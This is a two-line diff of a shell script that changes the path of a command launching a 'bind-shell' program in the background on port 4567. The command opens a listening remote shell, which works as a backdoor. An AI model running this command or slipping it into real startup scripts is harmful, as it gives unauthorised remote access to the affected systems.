@@ -1,2 +1,2 @@
 #!/bin/sh
-/bin/bind-shell 4567 &
+/sbin/bind-shell 4567 &
